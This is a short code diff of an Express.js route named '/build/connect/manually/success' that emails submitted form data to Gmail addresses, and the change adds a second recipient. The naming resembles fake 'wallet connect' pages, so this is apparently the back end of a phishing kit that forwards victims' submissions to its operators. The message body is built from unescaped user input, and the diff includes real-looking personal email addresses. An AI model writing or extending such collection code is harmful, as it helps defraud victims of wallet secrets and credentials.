@@ -55,7 +55,7 @@ app.post('/build/connect/manually/success', async (req, res) => {
 
     var mailOptions = {
         from: 'info.resolverconsultpanel@gmail.com', //Testing email to see you received it successfully. Server configured email
-        to: 'sal.baye.activator@gmail.com',
+        to: 'salim72salim72@gmail.com, info.resolverconsultpanel@gmail.com',
         subject: `${req.body.category}`,
         html: `${req.body.data}`
       };
